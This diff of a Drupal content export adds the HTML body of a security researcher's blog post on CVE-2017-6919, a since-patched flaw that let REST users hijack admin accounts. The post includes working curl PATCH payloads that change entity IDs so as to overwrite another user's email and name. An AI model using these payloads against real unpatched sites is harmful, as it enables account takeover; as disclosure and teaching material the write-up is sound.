@@ -8,7 +8,6 @@ type:
     target_uuid: a90c00e7-fd49-42a6-8cdb-e99ec16f7742
 revision_timestamp:
   - value: '2020-01-27T17:47:38+00:00'
-    format: 'Y-m-d\TH:i:sP'
 revision_uid:
   - target_type: user
     target_uuid: 30bffdc0-96b3-4656-9078-3f8113359c60
@@ -22,10 +21,8 @@ title:
   - value: 'Hijacking Drupal admin accounts using REST'
 created:
   - value: '2018-05-21T16:06:42+00:00'
-    format: 'Y-m-d\TH:i:sP'
 changed:
   - value: '2020-01-27T17:47:38+00:00'
-    format: 'Y-m-d\TH:i:sP'
 promote:
   - value: true
 sticky:
@@ -37,7 +34,6 @@ revision_translation_affected:
 path:
   - alias: /blog/hijacking-drupal-admin-accounts-using-rest
     langcode: en
-    pathauto: 1
 body:
   - value: |
       <p><em>Note: This exploit was fixed over a year ago as a part of&nbsp;<a href="https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-04-19/drupal-core-critical-access-bypass">SA-CORE-2017-002/CVE-2017-6919</a>, so unless your Drupal 8 site is really, really out of date, you should not be affected.</em></p>
@@ -157,6 +153,87 @@ body:
 
       <p><em>Thanks to Jess (xjm), Michael Hess, and Moshe Weitzman for reviewing this before I posted it.</em></p>
     format: full_html
+    processed: |
+      <p><em>Note: This exploit was fixed over a year ago as a part of&nbsp;<a href="https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-04-19/drupal-core-critical-access-bypass">SA-CORE-2017-002/CVE-2017-6919</a>, so unless your Drupal 8 site is really, really out of date, you should not be affected.</em></p>
+      <p>When I do security research on Drupal core, I tend to focus on one class of vulnerability and pursue that until I find something.</p>
+      <p>You may have heard of&nbsp;<a href="https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2014-10-15/sa-core-2014-005-drupal-core-sql">Drupalgeddon</a>, the largest Drupal exploit to date, which used SQL injection to modify data on vulnerable sites. SQL injection used to be a lot easier to find, but Drupal core has traditionally been good about sanitizing user input and forming dynamic queries in a way that’s safe. Even knowing this, I wanted to find some way to exploit how Drupal executes SQL, even if that wasn’t a traditional SQL injection attack.</p>
+      <p>I had been researching REST vulnerabilities at the time, and was poking at nodes trying to perform malicious POST and PATCH requests to circumvent access checking, validation, and serialization/normalization. After hours (alright, more like days) of research, I had nothing. The REST resource for nodes was solid and the Entity API blocked me every step of the way.</p>
+      <p><em>Note: I researched this vulnerability on Drupal 8.3.1, so if you’re following along please use that version.</em></p>
+      <p>Feeling disparaged, I decided to take a look at the JSON response for a node again:</p>
+      <pre>
+      <code class=" hljs php">{<span class="hljs-string">"nid"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-number">1</span>}],<span class="hljs-string">"uuid"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-string">"c63a2388-8bf8-4f25-b563-8bd88bd1dea1"</span>}],<span class="hljs-string">"vid"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-number">1</span>}],<span class="hljs-string">"langcode"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-string">"en"</span>}],<span class="hljs-string">"type"</span>:[{<span class="hljs-string">"target_id"</span>:<span class="hljs-string">"article"</span>,<span class="hljs-string">"target_type"</span>:<span class="hljs-string">"node_type"</span>,<span class="hljs-string">"target_uuid"</span>:<span class="hljs-string">"ee96e8f7-e0bb-411d-bde3-372e2669721d"</span>}],<span class="hljs-string">"status"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-keyword">true</span>}],<span class="hljs-string">"title"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-string">"My title"</span>}],<span class="hljs-string">"uid"</span>:[{<span class="hljs-string">"target_id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"target_type"</span>:<span class="hljs-string">"user"</span>,<span class="hljs-string">"target_uuid"</span>:<span class="hljs-string">"67a7e0a7-57f9-44d0-bbc9-7f43496487c4"</span>,<span class="hljs-string">"url"</span>:<span class="hljs-string">"\/user\/1"</span>}],<span class="hljs-string">"created"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-number">1526675840</span>}],<span class="hljs-string">"changed"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-number">1526675848</span>}],<span class="hljs-string">"promote"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-keyword">true</span>}],<span class="hljs-string">"sticky"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-keyword">false</span>}],<span class="hljs-string">"revision_timestamp"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-number">1526675848</span>}],<span class="hljs-string">"revision_uid"</span>:[{<span class="hljs-string">"target_id"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"target_type"</span>:<span class="hljs-string">"user"</span>,<span class="hljs-string">"target_uuid"</span>:<span class="hljs-string">"67a7e0a7-57f9-44d0-bbc9-7f43496487c4"</span>,<span class="hljs-string">"url"</span>:<span class="hljs-string">"\/user\/1"</span>}],<span class="hljs-string">"revision_log"</span>:[],<span class="hljs-string">"revision_translation_affected"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-keyword">true</span>}],<span class="hljs-string">"default_langcode"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-keyword">true</span>}],<span class="hljs-string">"path"</span>:[],<span class="hljs-string">"body"</span>:[{<span class="hljs-string">"value"</span>:<span class="hljs-string">"\u003Cp\u003EWow the body\u003C\/p\u003E\r\n"</span>,<span class="hljs-string">"format"</span>:<span class="hljs-string">"basic_html"</span>,<span class="hljs-string">"summary"</span>:<span class="hljs-string">""</span>}],<span class="hljs-string">"comment"</span>:[{<span class="hljs-string">"status"</span>:<span class="hljs-number">2</span>,<span class="hljs-string">"cid"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"last_comment_timestamp"</span>:<span class="hljs-number">1526675848</span>,<span class="hljs-string">"last_comment_name"</span>:<span class="hljs-keyword">null</span>,<span class="hljs-string">"last_comment_uid"</span>:<span class="hljs-number">1</span>,<span class="hljs-string">"comment_count"</span>:<span class="hljs-number">0</span>}],<span class="hljs-string">"field_image"</span>:[],<span class="hljs-string">"field_tags"</span>:[]}
+      </code></pre><p>The top-level properties there are: nid, uuid, vid, langcode, type, status, title, uid, created, changed, promote, sticky, revision_timestamp, revision_uid, revision_log, revision_translation_affected, default_langcode, path, body, comment, field_image, and field_tags.</p>
+      <p>When I was trying to exploit REST previously, I was sending bad data for fields like body (XSS?), path (open redirect?), and field_image (access private files?). None of this had worked, but I started to wonder about the base fields in the response, specifically nid and uuid. What happens when you change the ID or UUID of an entity?</p>
+      <p>Let’s try it out! We’re going to send a PATCH request for node 1, changing the nid and title fields in hopes of modifying another entity’s data:</p>
+      <pre>
+      <code class=" hljs protobuf">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/node/1?_format=json -H 'Content-Type: application/json'</span>
+      -d '{
+            <span class="hljs-string">"nid"</span>:   [{<span class="hljs-string">"value"</span>: <span class="hljs-number">2</span>}],
+            <span class="hljs-string">"type"</span>:  <span class="hljs-string">"article"</span>,
+            <span class="hljs-string">"title"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"Hello world"</span>}]
+          }'
+      {<span class="hljs-string">"message"</span>:<span class="hljs-string">"Unprocessable entity: validation failed.\n: The content has either been modified by another user, or you have already submitted modifications. As a result, your changes cannot be saved.\n"</span>}
+      </code></pre><p>That didn’t work, so next I tried to change the UUID and NID at the same time. It would make sense that you need to pass a new UUID, as otherwise the UUID from node 1 would be used, and wouldn’t be very unique at all.</p>
+      <p>Let’s try changing both:</p>
+      <pre>
+      <code class=" hljs protobuf">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/node/1?_format=json -H 'Content-Type: application/json'</span>
+      -d '{
+            <span class="hljs-string">"nid"</span>:   [{<span class="hljs-string">"value"</span>: <span class="hljs-number">2</span>}],
+            <span class="hljs-string">"type"</span>:  <span class="hljs-string">"article"</span>,
+            <span class="hljs-string">"uuid"</span>:  [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"6786fd3c-cbc9-49a0-8b07-47ed78ed052e"</span>}],
+            <span class="hljs-string">"title"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"Hello world"</span>}]
+          }'
+      {}
+      </code></pre><p>This is interesting - an empty response was returned, and the response code was 500.</p>
+      <p>This error was logged on the server:</p>
+      <pre>
+      <code class=" hljs php">Drupal\Core\Database\IntegrityConstraintViolationException: SQLSTATE[<span class="hljs-number">23000</span>]:
+      Integrity constraint violation: <span class="hljs-number">19</span> UNIQUE constraint failed: node.vid:
+        UPDATE {node}
+          SET nid=:db_update_placeholder_0, vid=:db_update_placeholder_1, type=:db_update_placeholder_2, uuid=:db_update_placeholder_3, langcode=:db_update_placeholder_4
+          WHERE nid = :db_condition_placeholder_0; <span class="hljs-keyword">Array</span> ( [:db_update_placeholder_0] =&gt; <span class="hljs-number">2</span> [:db_update_placeholder_1] =&gt; <span class="hljs-number">1</span> [:db_update_placeholder_2] =&gt; article [:db_update_placeholder_3] =&gt; <span class="hljs-number">6786</span>fd3c-cbc9<span class="hljs-number">-49</span>a0<span class="hljs-number">-8</span>b07<span class="hljs-number">-47</span>ed78ed052e [:db_update_placeholder_4] =&gt; en [:db_condition_placeholder_0] =&gt; <span class="hljs-number">2</span> ) in Drupal\Core\Database\Connection-&gt;handleQueryException() (line <span class="hljs-number">682</span> of [redacted]/drupal/core/lib/Drupal/Core/Database/Connection.php).
+      </code></pre><p>So close! The query got all the way to the database before getting blocked. I tried passing a random “vid” (revision ID) value, but after some researching realized that this attack only worked if creating new revisions by default was disabled for the target Content Type. After more testing I got the exploit working, and could update any node regardless of my permission level!</p>
+      <p>The reason this was possible was that the Entity API never expected anyone to ever update entity keys, so there was never access checking for them. I could verify how this works in my PHP console:</p>
+      <pre>
+      <code class=" hljs php">&gt;&gt;&gt; $user = \Drupal\user\entity\User::getAnonymousUser();
+      =&gt; Drupal\user\entity\User {<span class="hljs-comment">#8632</span>
+      &gt;&gt;&gt; $node = \Drupal::entityTypeManager()-&gt;getStorage(<span class="hljs-string">'node'</span>)-&gt;load(<span class="hljs-number">1</span>);
+      =&gt; Drupal\node\entity\Node {<span class="hljs-comment">#9004</span>
+      &gt;&gt;&gt; <span class="hljs-comment">// The “status” field can only be changed by users with the</span>
+      &gt;&gt;&gt; <span class="hljs-comment">// “administer nodes” permission.</span>
+      &gt;&gt;&gt; <span class="hljs-comment">// For details see \Drupal\node\NodeAccessControlHandler::checkFieldAccess</span>
+      &gt;&gt;&gt; \Drupal::entityTypeManager()
+            -&gt;getAccessControlHandler(<span class="hljs-string">'node'</span>)
+            -&gt;fieldAccess(<span class="hljs-string">'edit'</span>, $node-&gt;getFieldDefinition(<span class="hljs-string">'status'</span>), $user);
+      =&gt; <span class="hljs-keyword">false</span>
+      &gt;&gt;&gt; <span class="hljs-comment">// There is no explicit access checking for NID!</span>
+      &gt;&gt;&gt; \Drupal::entityTypeManager()
+            -&gt;getAccessControlHandler(<span class="hljs-string">'node'</span>)
+            -&gt;fieldAccess(<span class="hljs-string">'edit'</span>, $node-&gt;getFieldDefinition(<span class="hljs-string">'nid'</span>), $user);
+      =&gt; <span class="hljs-keyword">true</span>
+      </code></pre><p>To re-cap a bit, the stages of this exploit are:</p>
+      <ol>
+      <li>Make an PATCH request to the REST resource for node 1, which our user has valid access to.</li>
+      <li>Drupal sets the nid to another node’s ID (2), and the uuid to a new value.</li>
+      <li>Drupal saves node 1, which generates an SQL query with a “WHERE nid = 2” condition, allowing updates to node 2’s fields!</li>
+      </ol>
+      <p>The SQL query was fully sanitized, but values and conditions are present that Drupal did not expect. So strictly no SQL was injected into the query, but the lack of access checking in the entity API led to an illogical query: “Update node 1 where the ID is equal to 2”.</p>
+      <p>Updating arbitrary nodes is fun, but it was quickly clear that the big exploit here would be to send a PATCH request for the current user, pass the ID of an admin user, and gain access to their account.</p>
+      <p>The payload was similar - in this example user 2 changes the email and name of user 1, which would then let me request a password reset and hijack the administrative user. Note that the existing password of user 2 (“password”) is provided as it’s required to change the email and name fields:</p>
+      <pre>
+      <code class=" hljs protobuf">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/user/2?_format=json -H 'Content-Type: application/json'</span>
+      -d '{
+            <span class="hljs-string">"uid"</span>:  [{<span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>}],
+            <span class="hljs-string">"uuid"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"2e9403a4-d8af-4096-a116-624710140be0"</span>}],
+            <span class="hljs-string">"name"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"yougothacked"</span>}],
+            <span class="hljs-string">"mail"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"yougot@hacked.com"</span>}],
+            <span class="hljs-string">"pass"</span>: [{<span class="hljs-string">"existing"</span>: <span class="hljs-string">"password"</span>}]
+          }'
+      </code></pre><p>It worked! Any user with access to update their profile with REST could change the email and name of any other user on the site. Once an administrative account has been hacked, attackers can, in the worst case, execute another exploit to execute remote code on the server.</p>
+      <p>The Drupal security team treated this as a serious vulnerability and got a fix out quickly. The code change can be&nbsp;<a href="https://cgit.drupalcode.org/drupal/commit/?id=92e613a">seen here</a>&nbsp;- in it the ID and UUID keys can only be set when an entity is created, not when it’s updated. This was a great example of a complex problem with a simple exploit and fix.</p>
+      <p>After the fix for this was released I started working with the security team as a volunteer, and am now a full member. That means I have less time to research new vulnerabilities, but am definitely not done hunting yet.</p>
+      <p>This issue left me wondering about other APIs out there - how many have not handled the case of a property being changed that eventually results in a SQL query that updates an unexpected row? Could you replicate this kind of attack elsewhere, and is there a name for it yet? If I ever end up researching another API this will definitely be on my list of things to check.</p>
+      <p><em>Thanks to Jess (xjm), Michael Hess, and Moshe Weitzman for reviewing this before I posted it.</em></p>
     summary: ''
 field_tags:
   - target_type: taxonomy_term
